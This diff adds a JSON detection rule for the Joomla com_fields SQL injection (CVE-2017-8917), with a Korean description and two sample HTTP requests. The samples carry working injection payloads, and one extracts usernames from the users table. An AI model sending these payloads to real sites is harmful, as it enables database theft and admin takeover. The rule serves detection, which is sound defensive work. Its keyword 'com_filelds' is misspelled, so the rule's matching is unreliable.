@@ -1,0 +1,10 @@
+{
+	"Name": "Joomla SQL Injection-1",
+	"Description": "ComFields\n- 저장되어 있던 구성 요소를 가져오는 역할을 수행할 때, 관리자 엑세스 권한을 가져올 수 있음\n- 공격자가 지정되지 않은 벡터를 통해 임의의 SQL 명령을 실행할 수있게함",
+	"References": ["CVE-2017-8917"],
+	"Samples": [
+		"GET /joomla/index.php?option=com_fields&layout=modal&list%5Bfullordering%5D=updatexml%29%20AND%209308%3D9308%20AND%20%288829%3D8829 HTTP/1.1",
+		"GET /joomla/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x54534c54534c,(SELECT%20username%20FROM%20hwmby_users),0x54534c54534c,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a) HTTP/1.1"],
+	"Keywords": [["joomla", "index\\.php", "option", "=com_filelds"]],
+	"Signature": []
+}
